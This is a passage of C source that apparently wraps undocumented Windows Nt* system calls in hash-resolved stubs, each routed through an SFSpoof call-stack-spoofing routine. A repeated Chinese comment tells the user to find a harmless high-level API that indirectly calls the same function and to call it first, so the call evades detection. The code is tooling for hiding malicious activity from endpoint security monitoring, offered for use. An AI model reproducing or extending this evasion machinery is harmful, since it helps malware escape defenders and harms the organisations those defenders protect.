    Params.param[1] = (DWORD_PTR)DeviceHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x093DD9250;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtClearAllSavepointsTransaction(HANDLE TransactionHandle) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x034AC3A31;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtClearSavepointTransaction(HANDLE TransactionHandle, ULONG SavePointId) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)SavePointId;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x097409BDA;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRollbackSavepointTransaction(HANDLE TransactionHandle, ULONG SavePointId) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)SavePointId;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00049DEF9;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSavepointTransaction(HANDLE TransactionHandle, BOOLEAN Flag, ULONG SavePointId) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)Flag;
    Params.param[3] = (DWORD_PTR)SavePointId;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0DE48C2D9;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSavepointComplete(HANDLE TransactionHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x094CB8240;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateSectionEx(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle, PMEM_EXTENDED_PARAMETER ExtendedParameters, ULONG ExtendedParametersCount) {
    Params.param[1] = (DWORD_PTR)SectionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)MaximumSize;
    Params.param[5] = (DWORD_PTR)SectionPageProtection;
    Params.param[6] = (DWORD_PTR)AllocationAttributes;
    Params.param[7] = (DWORD_PTR)FileHandle;
    Params.param[8] = (DWORD_PTR)ExtendedParameters;
    Params.param[9] = (DWORD_PTR)ExtendedParametersCount;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x0BE94C062;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateCrossVmEvent() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0F055351C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

/*NTSTATUS SFNtGetPlugPlayEvent(HANDLE EventHandle, PVOID Context, PPLUGPLAY_EVENT_BLOCK EventBlock, ULONG EventBufferSize) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = (DWORD_PTR)Context;
    Params.param[3] = (DWORD_PTR)EventBlock;
    Params.param[4] = (DWORD_PTR)EventBufferSize;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0D14BDCCA;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}*/

NTSTATUS SFNtListTransactions() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x00556C30D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtMarshallTransaction() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x080CA479A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtPullTransaction() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x09C0BBE9B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReleaseCMFViewOwnership() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x04E952A7E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWaitForWnfNotifications() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0078B2F11;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtStartTm() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0874BBDE4;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetInformationProcess(HANDLE DeviceHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG Length) {
    Params.param[1] = (DWORD_PTR)DeviceHandle;
    Params.param[2] = (DWORD_PTR)ProcessInformationClass;
    Params.param[3] = (DWORD_PTR)ProcessInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0639C7A30;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRequestDeviceWakeup(HANDLE DeviceHandle) {
    Params.param[1] = (DWORD_PTR)DeviceHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x005973536;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRequestWakeupLatency(ULONG LatencyTime) {
    Params.param[1] = (DWORD_PTR)LatencyTime;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x08804A7A0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySystemTime(PLARGE_INTEGER SystemTime) {
    Params.param[1] = (DWORD_PTR)SystemTime;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x09A0F97AF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtManageHotPatch(ULONG UnknownParameter1, ULONG UnknownParameter2, ULONG UnknownParameter3, ULONG UnknownParameter4) {
    Params.param[1] = (DWORD_PTR)UnknownParameter1;
    Params.param[2] = (DWORD_PTR)UnknownParameter2;
    Params.param[3] = (DWORD_PTR)UnknownParameter3;
    Params.param[4] = (DWORD_PTR)UnknownParameter4;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0FC4230E6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtContinueEx(PCONTEXT ContextRecord, PKCONTINUE_ARGUMENT ContinueArgument) {
    Params.param[1] = (DWORD_PTR)ContextRecord;
    Params.param[2] = (DWORD_PTR)ContinueArgument;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0F360C6DD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}
